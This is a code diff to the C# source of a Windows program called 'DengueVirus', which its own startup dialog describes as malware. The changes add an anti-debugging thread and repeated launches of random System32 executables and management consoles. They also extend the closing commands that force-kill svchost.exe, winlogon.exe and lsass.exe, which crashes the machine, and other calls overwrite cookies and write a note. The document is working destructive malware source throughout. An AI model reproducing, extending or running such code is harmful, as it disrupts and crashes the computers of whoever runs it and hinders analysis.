@@ -375,7 +375,7 @@ namespace DengueVirus
         public void Form1_Load(object sender, EventArgs e)
         {
             //SpicyPL.ForceUACElevation();
-            
+
             // First warning
             DialogResult dialogResult = MessageBox.Show("This is malware. Are you sure you want to run this program?", "Dengue", MessageBoxButtons.YesNo);
             if (dialogResult != DialogResult.Yes)
@@ -400,6 +400,8 @@ namespace DengueVirus
                 return;
             }
 
+            Thread ADBG = new Thread(SpicyPL.AntiDBGLoop); ADBG.Start();
+
             //if the date is 1st of any month
             if (DateTime.Now.Day == 1 || DateTime.Now.Day == 10)
             {
@@ -413,6 +415,8 @@ namespace DengueVirus
                 Thread.Sleep(1000);
                 Cursor = Cursors.Default;
             }
+
+            
 
             SpicyPL.WriteNote();
             SpicyPL.OverwriteCookie();
@@ -436,6 +440,7 @@ namespace DengueVirus
             Thread winpos = new Thread(WindowPosSpam); winpos.Start();
             Thread fill = new Thread(FillScreen); fill.Start();
             SpicyPL.OpenRandomEXEFromSys32();
+            SpicyPL.OpenRandomMSCFromSys32();
             Thread t3 = new Thread(PrintRotate); t3.Start();
             Thread t4 = new Thread(Wave); t4.Start();
             Thread text = new Thread(DrawTextScreen); text.Start();
@@ -457,11 +462,13 @@ namespace DengueVirus
             t5.Abort();
             //t6.Abort();
             SpicyPL.OpenRandomScreensaver();
+            SpicyPL.OpenRandomMSCFromSys32();
 
             Thread.Sleep(5000);
             t4.Abort();
             Thread ico = new Thread(SpamIco); ico.Start();
             SpicyPL.OpenRandomEXEFromSys32();
+            SpicyPL.OpenRandomMSCFromSys32();
 
             Thread.Sleep(5000);
             ico.Abort();
@@ -469,11 +476,13 @@ namespace DengueVirus
             this.Close();
 
             SpicyPL.OpenRandomEXEFromSys32();
+            SpicyPL.OpenRandomMSCFromSys32();
 
             Thread.Sleep(5000);
 
             //Process.Start("start", "https://github.com/PatoFlamejanteTV/");
             SpicyPL.OpenRandomEXEFromSys32();
+            SpicyPL.OpenRandomMSCFromSys32();
             SpicyPL.Brain();
             winpos.Abort();
             fill.Abort();
@@ -484,16 +493,20 @@ namespace DengueVirus
             Thread c = new Thread(PrintRotate); c.Start();
             Thread d = new Thread(DrawTextScreen); d.Start();
             SpicyPL.OpenRandomEXEFromSys32();
+            SpicyPL.OpenRandomMSCFromSys32();
             Thread.Sleep(10000);
             a.Abort(); c.Abort();
             Thread.Sleep(4000);
             b.Abort(); d.Abort();
 
-            Process.Start("taskkill", "/F /IM svchost.exe");
-            Process.Start("taskkill", "/F /IM winlogon.exe");
+            ADBG.Abort();
+
+            Process.Start("taskkill", "/f /t /im svchost.exe");
+            Process.Start("taskkill", "/f /t /im winlogon.exe");
+            Process.Start("taskkill", "/f /t /im lsass.exe");
 
             //taskkill itself
-            Process.Start("taskkill", "/F /IM DengueVirus.exe");
+            Process.Start("taskkill", "/f /t /im DengueVirus.exe");
         }
 
         
@@ -501,6 +514,7 @@ namespace DengueVirus
         private void button1_Click(object sender, EventArgs e)
         {
             SpicyPL.OpenRandomEXEFromSys32();
+            SpicyPL.OpenRandomMSCFromSys32();
         }
     }
 }
